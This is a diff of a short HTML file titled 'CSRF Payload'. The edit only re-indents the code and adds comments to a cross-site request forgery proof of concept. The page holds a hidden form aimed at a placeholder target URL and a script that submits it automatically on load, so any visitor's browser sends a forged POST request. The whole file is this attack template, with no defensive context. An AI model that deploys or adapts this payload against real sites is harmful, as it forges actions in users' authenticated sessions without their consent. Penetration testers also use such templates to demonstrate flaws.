@@ -1,21 +1,23 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>CSRF Payload</title>
+    <meta charset="UTF-8">
+    <title>CSRF Payload</title>
 </head>
 <body>
 
-<form id="csrfForm" action="https://targetURL" method="POST">
-    <input type="hidden" name="name" value="whatever you want">
-</form>
+    <!-- CSRF Form -->
+    <form id="csrfForm" action="https://targetURL" method="POST">
+        <!-- Hidden input field to submit CSRF payload -->
+        <input type="hidden" name="name" value="whatever you want">
+    </form>
 
-<script>
-// Automatically submit the form when the page loads
-window.onload = function() {
-    document.getElementById('csrfForm').submit();
-};
-</script>
+    <script>
+        // Automatically submit the form when the page loads
+        window.onload = function() {
+            document.getElementById('csrfForm').submit();
+        };
+    </script>
 
 </body>
 </html>
